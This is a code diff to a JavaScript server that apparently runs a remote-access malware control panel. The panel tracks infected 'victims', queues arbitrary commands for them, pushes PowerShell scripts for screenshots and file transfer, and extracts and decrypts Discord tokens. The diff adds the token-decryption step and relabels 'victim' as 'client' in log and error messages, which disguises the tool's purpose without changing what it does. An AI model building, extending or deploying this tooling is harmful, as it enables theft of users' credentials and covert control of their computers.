@@ -40,11 +40,11 @@ function getIdentity(req) {
 
 function ensureVictim(identity) {
   if (!victimsLastSeen.has(identity)) {
-    const shortId = `victim${nextVictimId++}`;
+    const shortId = `client ${nextVictimId++}`;
     victimsLastSeen.set(identity, { last_seen: Date.now() / 1000, id: shortId });
     idToIdentity.set(shortId, identity);
     commandQueue.set(identity, []);
-    console.log(`[New Victim] ${shortId}: ${identity}`);
+    console.log(`[New Client] ${shortId}: ${identity}`);
   } else {
     victimsLastSeen.get(identity).last_seen = Date.now() / 1000;
   }
@@ -73,7 +73,7 @@ app.post("/api/clear", (req, res) => {
   commandQueue.clear();
   outputLog = [];
   nextVictimId = 1;
-  console.log("[Dashboard] Cleared all victim and log data");
+  console.log("[Dashboard] Cleared all client and log data");
   res.sendStatus(200);
 });
 
@@ -84,7 +84,6 @@ function handleScreenshot(output_data) {
         ["Decode_Screenshot.py", output_data],
         { cwd: "programs/screenshot" } 
       );
-      console.log("Spawned Python.");
       pythonProcess.stdout.on('data', (data) => {
         console.log(data.toString()); // this will print output from Decode_Screenshot.py
       });
@@ -92,13 +91,21 @@ function handleScreenshot(output_data) {
 }
 // TODO: Implement These two functions.
 //  [ ] handleFileTransfer needs a python decoder 
-//  [ ] handleDiscordTokenExtract needs to place output json in /temp folder
+//  [ ] handleDiscordTokenExtract needs to be tested 
 function handleFileTransfer(output_data) {
       console.log("Handling File Transfer Data...");
       current_command = "";
 }
 function handleDiscordTokenExtract(output_data) {
       console.log("Handling Discord Token Data...");
+      const pythonProcess = spawn(
+        "python",
+        ["DiscordDecrypt.py", output_data], // output_data is JSON allegedly
+        { cwd: "programs/discordtokens" } 
+      );
+      pythonProcess.stdout.on('data', (data) => {
+        console.log(data.toString()); 
+      });
       current_command = "";
 }
 
@@ -113,6 +120,7 @@ function handleOutput(output_data) {
       return;
     case "/send_discord_token_extract":
       handleDiscordTokenExtract(output_data);
+      console.log("Done Handling Tokens.");
       return;
   }
 }
@@ -147,7 +155,7 @@ app.post("/send-calc", (req, res) => {
   for (const identity of victimsLastSeen.keys()) {
     commandQueue.get(identity).push("start calc");
   }
-  console.log("[Dashboard] Broadcasted 'start calc' to all victims");
+  console.log("[Dashboard] Broadcasted 'start calc' to all clients");
   res.sendStatus(200);
 });
 
@@ -156,7 +164,7 @@ app.post("/send_screenshot", (req, res) => {
   current_command = "/send_screenshot"
   const { victim_id } = req.body;
   const identity = idToIdentity.get(victim_id);
-  if (!identity) return res.status(400).send("Invalid victim ID");
+  if (!identity) return res.status(400).send("Invalid client ID");
 
   const scriptPath = path.join(__dirname, "programs", "screenshot", "Screenshot.ps1");
   let command;
@@ -175,7 +183,7 @@ app.post("/send_screenshot", (req, res) => {
 app.post("/send_file_transfer", (req, res) => {
   const { victim_id } = req.body;
   const identity = idToIdentity.get(victim_id);
-  if (!identity) return res.status(400).send("Invalid victim ID");
+  if (!identity) return res.status(400).send("Invalid client ID");
 
   const scriptPath = path.join(__dirname, "programs", "filetransfer", "FileTransfer.ps1");
   let command;
@@ -194,7 +202,7 @@ app.post("/send_file_transfer", (req, res) => {
 app.post("/send_discord_token_extract", (req, res) => {
   const { victim_id } = req.body;
   const identity = idToIdentity.get(victim_id);
-  if (!identity) return res.status(400).send("Invalid victim ID");
+  if (!identity) return res.status(400).send("Invalid client ID");
 
   const scriptPath = path.join(__dirname, "programs", "discordtokens", "DiscordExtract.ps1");
   let command;
@@ -214,7 +222,7 @@ app.post("/send_discord_token_extract", (req, res) => {
 app.post("/send_command", (req, res) => {
   const { victim_id, command } = req.body;
   const identity = idToIdentity.get(victim_id);
-  if (!identity) return res.status(400).send("Invalid victim ID");
+  if (!identity) return res.status(400).send("Invalid client ID");
 
   commandQueue.get(identity).push(command);
   console.log(`[Dashboard] Sent command '${command}' to ${victim_id}`);
